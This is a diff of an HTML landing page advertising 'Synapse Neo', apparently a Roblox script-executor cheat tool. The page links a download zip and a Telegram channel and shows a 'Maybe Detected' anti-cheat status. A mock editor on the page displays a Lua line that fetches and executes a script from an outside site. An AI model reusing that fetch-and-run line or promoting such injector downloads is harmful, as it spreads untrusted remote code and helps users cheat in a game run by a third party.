@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Synapse Neo | Advanced Script Executor</title>
+    <title>Synapse Neo | 2026 Edition</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&family=Plus+Jakarta+Sans:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
             --neon-blue: #00f2ff;
-            --deep-space: #0a0a0c;
+            --deep-space: #08080a;
         }
         body {
             background-color: var(--deep-space);
@@ -18,115 +18,134 @@
             overflow-x: hidden;
             margin: 0;
         }
-        .glow-effect {
-            box-shadow: 0 0 30px rgba(0, 242, 255, 0.05);
+
+        .executor-window {
+            background: #111114;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
+            width: 100%;
+            max-width: 950px; 
         }
         .code-font { font-family: 'JetBrains Mono', monospace; }
         
-        .fade-in { animation: fadeIn 1s ease-out; }
+        .fade-in { animation: fadeIn 0.8s ease-out; }
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
+            from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #0f0f12; }
-        ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--neon-blue); }
-
         .btn-grad {
-            background: linear-gradient(90deg, #2563eb 0%, #0891b2 100%);
-            transition: all 0.3s ease;
+            background: linear-gradient(90deg, #1d4ed8 0%, #0891b2 100%);
+            transition: all 0.2s ease;
         }
         .btn-grad:hover {
             filter: brightness(1.1);
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(37, 99, 235, 0.2);
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(29, 78, 216, 0.4);
         }
+        
+        .custom-scroll::-webkit-scrollbar { width: 6px; }
+        .custom-scroll::-webkit-scrollbar-track { background: #0a0a0c; }
+        .custom-scroll::-webkit-scrollbar-thumb { background: #222; border-radius: 10px; }
+        
+        .tg-link:hover { color: #229ED9; }
     </style>
 </head>
 <body>
 
-    <div class="bg-yellow-500/10 border-b border-yellow-500/20 text-center py-2 text-xs font-medium tracking-widest uppercase text-yellow-500">
-        Status: <span class="font-bold">Maybe Detected</span> | Last Update: Jan 2026
+    <div class="bg-yellow-500/10 border-b border-yellow-500/20 text-center py-2 text-[10px] font-bold tracking-[0.3em] uppercase text-yellow-500">
+        Status: Maybe Detected | Version 1.1 | Jan 2026
     </div>
 
-    <header class="flex justify-between items-center px-8 py-6 max-w-6xl mx-auto">
-        <div class="text-xl font-extrabold tracking-tighter flex items-center gap-3">
-            <div class="w-9 h-9 bg-blue-600 rounded-xl flex items-center justify-center text-white shadow-lg shadow-blue-600/20">S</div>
-            <span class="tracking-tight">SYNAPSE <span class="text-blue-500">NEO</span></span>
+    <header class="flex justify-between items-center px-8 py-8 max-w-7xl mx-auto">
+        <div class="text-2xl font-black tracking-tighter flex items-center gap-3">
+            <div class="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center text-white shadow-xl shadow-blue-600/30 font-mono">S</div>
+            <span>SYNAPSE <span class="text-blue-500 font-light">NEO</span></span>
         </div>
-        <nav class="flex gap-8 text-sm font-semibold text-gray-400">
-            <a href="#" class="hover:text-white transition-colors">Documentation</a>
-            <a href="#" class="hover:text-white transition-colors">Scripts</a>
-            <a href="https://discord.gg/yourlink" class="hover:text-white transition-colors text-blue-400">Discord</a>
+        <nav class="hidden md:flex gap-10 text-xs font-bold uppercase tracking-widest text-gray-500">
+            <a href="#" class="hover:text-blue-400 transition">Docs [Soon]</a>
+            <a href="https://menwey.github.io/Synapse-Neo/scripts" class="hover:text-blue-400 transition">Scripts</a>
+            <a href="https://t.me/SynapseNeo" class="tg-link transition flex items-center gap-2 text-gray-400">
+                Telegram
+            </a>
         </nav>
     </header>
 
-    <section class="max-w-6xl mx-auto px-6 py-20 grid lg:grid-cols-2 gap-16 items-center">
-        <div class="fade-in">
-            <h1 class="text-6xl lg:text-7xl font-extrabold leading-[1.1] mb-8 tracking-tight">
-                Execution <br> <span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-cyan-400">Redefined.</span>
+    <main class="max-w-7xl mx-auto px-6 pt-10 pb-24">
+        <div class="text-center mb-16 fade-in">
+            <h1 class="text-5xl md:text-7xl font-extrabold mb-6 tracking-tight">
+                Executor with <span class="text-blue-500">3-4 Level</span>
             </h1>
-            <p class="text-gray-400 text-lg mb-10 leading-relaxed max-w-lg">
-                Synapse Neo — базовый скрипт-экзекутор уровня Level 3-4.
+            <p class="text-gray-500 text-lg max-w-2xl mx-auto mb-8 font-medium">
+                Полностью переписанная Zovrara с обновленным API. <br>Встречайте — <span class="text-white">Synapse Neo</span>
             </p>
-            
-            <div class="flex flex-col sm:flex-row gap-5">
-                <a href="raw hueta.com" download class="btn-grad px-10 py-4 rounded-2xl font-bold text-center text-white">
-                    Download v1.0.2
-                </a>
-            </div>
-            <p class="mt-4 text-xs text-gray-600 uppercase tracking-widest font-bold">Windows 10 / 11 Supported</p>
+            <a href="https://github.com/Menwey/Synapse-Neo/raw/refs/heads/main/soon.zip" class="btn-grad px-12 py-5 rounded-xl font-black text-white inline-block shadow-2xl tracking-tighter">
+                DOWNLOAD NOW
+            </a>
         </div>
 
-        <div class="relative fade-in" style="animation-delay: 0.2s">
-            <div class="absolute -inset-4 bg-blue-500/10 rounded-full blur-3xl"></div>
-            <div class="relative bg-[#0f0f12] border border-white/10 rounded-2xl overflow-hidden glow-effect shadow-2xl">
-                
-                <div class="bg-[#16161a] p-4 border-b border-white/5 flex items-center justify-between">
-                    <div class="flex gap-2">
-                        <div class="w-3 h-3 rounded-full bg-white/5"></div>
-                        <div class="w-3 h-3 rounded-full bg-white/5"></div>
-                        <div class="w-3 h-3 rounded-full bg-white/5"></div>
+        <div class="executor-window mx-auto rounded-lg overflow-hidden fade-in shadow-blue-900/10" style="animation-delay: 0.2s">
+            <div class="bg-[#1a1a1e] px-4 py-2 border-b border-white/5 flex items-center justify-between">
+                <div class="flex items-center gap-4">
+                    <div class="flex gap-1.5">
+                        <div class="w-2.5 h-2.5 rounded-full bg-red-500/20"></div>
+                        <div class="w-2.5 h-2.5 rounded-full bg-yellow-500/20"></div>
+                        <div class="w-2.5 h-2.5 rounded-full bg-green-500/20"></div>
                     </div>
-                    <div class="text-[10px] text-gray-500 font-bold tracking-[0.2em] uppercase">Synapse Neo Engine</div>
-                    <div class="w-6"></div>
+                    <span class="text-[11px] font-bold text-gray-400 tracking-wider font-mono">Synapse Neo v1.1 - [Zovrara Core]</span>
+                </div>
+                <div class="text-[10px] text-gray-600 font-mono font-bold">L3-4 ENGINE</div>
+            </div>
+
+            <div class="flex">
+                <div class="w-16 bg-[#0d0d0f] border-r border-white/5 p-4 flex flex-col gap-6 items-center">
+                    <div class="w-7 h-7 border border-blue-500/40 rounded bg-blue-500/10 flex items-center justify-center text-[10px] text-blue-500">EXE</div>
+                    <div class="w-7 h-7 border border-white/5 rounded flex items-center justify-center text-[10px] text-gray-700">SCR</div>
+                    <div class="w-7 h-7 border border-white/5 rounded flex items-center justify-center text-[10px] text-gray-700">SET</div>
+                    <div class="mt-auto w-6 h-6 border border-white/5 rounded opacity-10"></div>
                 </div>
 
-                <div class="flex">
-                    <div class="w-14 border-r border-white/5 bg-[#0a0a0c] p-4 flex flex-col gap-6 items-center">
-                        <div class="w-5 h-5 border-2 border-blue-500 rounded-md opacity-80"></div>
-                        <div class="w-5 h-5 border-2 border-gray-700 rounded-md opacity-40"></div>
-                        <div class="w-5 h-5 border-2 border-gray-700 rounded-md opacity-40"></div>
-                    </div>
-                    <div class="p-8 code-font text-sm leading-7 w-full min-h-[250px] bg-gradient-to-br from-transparent to-blue-500/[0.02]">
-                        <p><span class="text-purple-400">local</span> synapse = <span class="text-blue-400">getgenv</span>().Neo</p>
-                        <p><span class="text-purple-400">local</span> player = game.Players.LocalPlayer</p>
+                <div class="flex-1 bg-[#0a0a0c] p-10 custom-scroll overflow-y-auto" style="height: 500px;">
+                    <div class="code-font text-[15px] leading-relaxed">
+                        <p class="text-gray-600 mb-4">-- Synapse Neo load</p>
+                        <p><span class="text-purple-400">local</span> engine = <span class="text-blue-400">getgenv</span>().NeoExecutor</p>
+                        <p><span class="text-purple-400">local</span> settings = {</p>
+                        <p>&nbsp;&nbsp;AutoInject = <span class="text-orange-400">false</span>,</p>
+                        <p>&nbsp;&nbsp;Level = <span class="text-orange-400">3.5</span>,</p>
+                        <p>&nbsp;&nbsp;Core = <span class="text-green-400">"Zovrara_V2"</span></p>
+                        <p>}</p>
                         <p>&nbsp;</p>
-                        <p>synapse:InternalRun({</p>
-                        <p>&nbsp;&nbsp;Method = <span class="text-green-400">"Level8_Injection"</span>,</p>
-                        <p>&nbsp;&nbsp;FastWait = <span class="text-orange-400">true</span></p>
-                        <p>})</p>
+                        <p><span class="text-blue-400">print</span>(<span class="text-green-400">"Initializing level 3-4 environment..."</span>)</p>
                         <p>&nbsp;</p>
-                        <p><span class="text-blue-400">print</span>(<span class="text-green-400">"Synapse Neo: Active"</span>)</p>
+                        <p>engine:Attach()</p>
+                        <p>engine:Execute(<span class="text-green-400">"https://mix-sms.site/main.lua"</span>)</p>
+                        <p>&nbsp;</p>
+                        <p><span class="text-gray-600">-- Ready for execution</span></p>
+                        <p><span class="text-blue-400">warn</span>(<span class="text-green-400">"Neo Loaded Successfully"</span>)</p>
                     </div>
                 </div>
+            </div>
 
-                <div class="bg-[#16161a] p-4 border-t border-white/5 flex justify-end">
-                    <button class="bg-blue-600/90 hover:bg-blue-500 px-7 py-2 rounded-lg text-[11px] font-black text-white transition-all uppercase tracking-widest">
-                        Execute
+            <div class="bg-[#16161a] px-6 py-4 border-t border-white/5 flex justify-between items-center">
+                <div class="flex gap-6 items-center">
+                    <span class="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Ready</span>
+                    <div class="h-4 w-[1px] bg-white/5"></div>
+                    <span class="text-[10px] text-blue-500/50 font-bold uppercase">FPS: 144</span>
+                </div>
+                <div class="flex gap-4">
+                    <button class="bg-[#1a1a1e] border border-white/5 hover:bg-white/5 text-gray-400 px-6 py-2 rounded text-[11px] font-bold uppercase transition-all">
+                        Clear
+                    </button>
+                    <button class="bg-blue-600 hover:bg-blue-500 text-white px-10 py-2 rounded text-[11px] font-black uppercase tracking-widest transition-all shadow-lg shadow-blue-600/20">
+                        EXECUTE
                     </button>
                 </div>
             </div>
         </div>
-    </section>
+    </main>
 
-    <footer class="py-12 text-center border-t border-white/5 mt-20">
-        <p class="text-gray-600 text-sm font-medium tracking-tight">
-            &copy; 2026 <span class="text-gray-400 font-bold">Synapse Neo Project</span>. 
-            <span class="block mt-2 text-[10px] opacity-50 uppercase tracking-widest">Not affiliated with Roblox Corporation</span>
-        </p>
+    <footer class="py-12 text-center opacity-30 text-[10px] tracking-[0.4em] uppercase font-bold">
+        &copy; 2026 Synapse Neo | Not affiliated with Roblox Corporation
     </footer>
 
 </body>
